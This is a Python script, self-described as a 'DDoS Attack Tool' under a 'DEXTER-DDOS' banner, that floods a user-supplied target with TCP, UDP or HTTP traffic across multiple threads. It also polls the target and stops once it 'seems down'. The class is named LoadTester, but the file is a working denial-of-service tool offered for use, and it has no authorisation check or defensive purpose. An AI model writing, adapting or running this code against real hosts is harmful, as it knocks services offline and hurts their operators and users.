import socket
import threading
import time
import requests
import logging
import argparse
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import Fore, Style

colorama.init()

logo = f"""
{Fore.RED}██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗       ██████╗ ██████╗  ██████╗ ███████╗
{Fore.YELLOW}██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗      ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
{Fore.GREEN}██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝█████╗██║  ██║██║  ██║██║   ██║███████╗
{Fore.CYAN}██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗╚════╝██║  ██║██║  ██║██║   ██║╚════██║
{Fore.BLUE}██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║      ██████╔╝██████╔╝╚██████╔╝███████║
{Fore.MAGENTA}╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{Style.RESET_ALL}{Fore.WHITE}{' '*20}By{Fore.RED}44{Fore.BLUE}Viciius{Fore.MAGENTA}<3{Style.RESET_ALL}
"""

print(logo)

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

class LoadTester:
    def __init__(self, target, port, attack_type, threads=10, duration=30):
        self.target = target
        self.port = port
        self.attack_type = attack_type
        self.threads = threads
        self.duration = duration
        self.start_time = time.time()
        self.running = True

    def stop_attack(self):
        self.running = False

    def tcp_flood(self):
        while self.running and time.time() - self.start_time < self.duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.close()
            except Exception as e:
                logging.error(f"TCP Flood error: {e}")

    def udp_flood(self):
        while self.running and time.time() - self.start_time < self.duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b"X" * 1024, (self.target, self.port))
            except Exception as e:
                logging.error(f"UDP Flood error: {e}")

    def http_flood(self):
        while self.running and time.time() - self.start_time < self.duration:
            try:
                requests.get(f"http://{self.target}")
            except Exception as e:
                logging.error(f"HTTP Flood error: {e}")

    def monitor_target(self):
        while self.running:
            try:
                response = requests.get(f"http://{self.target}", timeout=3)
                logging.info(f"[MONITOR] Target status: {response.status_code}")
            except:
                logging.warning("[MONITOR] Target seems down!")
                self.stop_attack()
            time.sleep(5)

    def start_attack(self):
        logging.info(f"Starting {self.attack_type} attack on {self.target}:{self.port} with {self.threads} threads for {self.duration}s")
        attack_function = getattr(self, f"{self.attack_type}_flood", None)
        if not attack_function:
            logging.error("Invalid attack type")
            return

        monitor_thread = threading.Thread(target=self.monitor_target)
        monitor_thread.start()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(attack_function)

        self.running = False
        logging.info("Attack finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Tool By 44Viciius<3")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("attack_type", choices=["tcp", "udp", "http"], help="Type of attack")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--duration", type=int, default=30, help="Duration of attack in seconds")

    args = parser.parse_args()

    tester = LoadTester(target=args.target, port=args.port, attack_type=args.attack_type, threads=args.threads, duration=args.duration)
    tester.start_attack()

